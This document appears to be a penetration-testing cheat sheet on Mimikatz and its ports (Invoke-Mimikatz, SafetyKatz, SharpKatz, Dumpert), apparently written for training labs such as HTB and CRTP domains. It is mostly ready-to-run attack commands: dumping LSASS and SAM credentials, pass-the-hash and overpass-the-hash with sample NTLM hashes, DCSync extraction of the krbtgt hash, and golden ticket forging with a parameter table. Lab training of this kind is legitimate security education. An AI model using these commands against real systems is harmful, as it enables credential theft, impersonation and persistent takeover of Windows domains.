## # `Initial Command` -

Mimikatz modules facilitate password hash extraction from the `Local Security Authority Subsystem (LSASS)` process memory where they are cached.

Since `LSASS` is a privileged process running under the `SYSTEM` user, we must ==launch mimikatz from an administrative command prompt==. To extract password hashes, we must first execute two commands. The first is `privilege::debug`, which enables the `SeDebugPrivilge` access right required to tamper with another process. If this commands fails, mimikatz was most likely not executed with administrative privileges.

It’s important to understand that LSASS is a SYSTEM process, which means it has even higher privileges than mimikatz running with administrative privileges. To address this, we can use the `token::elevate` command to ==elevate the security token from high integrity (administrator) to SYSTEM integrity==. If mimikatz is launched from a SYSTEM shell, this step is not required.

```poershell
C:\> mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK 
mimikatz # token::elevate
```

## # `Dumping the SAM database using mimikatz` -

```powershell
mimikatz # lsadump::sam
```

## # `Dumping credentials of all logged-on users` -

```powershell
mimikatz # sekurlsa::logonpasswords
```

## # `Pass The Hash` -

You can use pass the hash technique with mimikatz to spawn powershell :

```powershell
mimikatz # sekurlsa::pth /user:henry.vinson /domain:htb.local /dc:htb.local /ntlm:e53d87d42adaa3ca32bdb34a876cbffb /command:powershell
```


## # `Invoke-Mimikatz` -

Invoke-Mimikatz, is a PowerShell port of Mimikatz. Using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the memory. All the functions of mimikatz could be used from this script.The script needs administrative privileges for dumping credentials from local machine.

• Dump credentials on a local machine using Mimikatz :

```powershell
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

• Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz) :

```powershell
SafetyKatz.exe "sekurlsa::ekeys"
```

• Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality) :

```powershell
SharpKatz.exe --Command ekeys
```

• Dump credentials using Dumpert (Direct System Calls and API unhooking) :

```powershell
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
```

• Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator) :

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256: /run:powershell.exe"'
```

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```

```powershell
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256: /run:cmd.exe" "exit"
```

The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).

- To extract credentials from the DC without code execution on it, we can use DCSync.To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain :

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

```powershell
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

By default, Domain Admins privileges are required to run DCSync.

- Dump all the hashes on the domain controller(privileges of DA) :

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

## # `Golden Ticket` -

• Execute mimikatz on DC as DA to get krbtgt hash :

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' – Computername dcorp-dc
```

• On any machine :

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

| Invoke-Mimikatz -Command   |   |
|-----------------------------|--------------------------------------------------------------------|
| kerberos::golden|Name of the module                                                             |
| /User:Administrator |Username for which the TGT is generated                                     |
| /domain:dollarcorp.moneycorp.local |Domain FQDN                                                  |
| /sid:S-1-5-21-1874506631-3219952063-538504511 | SID of the domain                                |                                                                
| /krbtgt:ff46a9d8bd66c6efd77603da26796f35 | NTLM (RC4) hash of the krbtgt account. Use /aes128 and /aes256 for using AES keys which is more silent.|
| /id:500 /groups:512 | Optional User RID (default 500) and Group default 513 512 520 518 519) |
| /ptt or /ticket  |  Injects the ticket in current PowerShell process - no need to save the ticket on disk ; Saves the ticket to a file for later use|
| /startoffset:0 | Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future.|
| /endin:600 | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes|
| /renewmax:10080 | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |

• To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges (or a user that has replication rights on the domain object) :

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

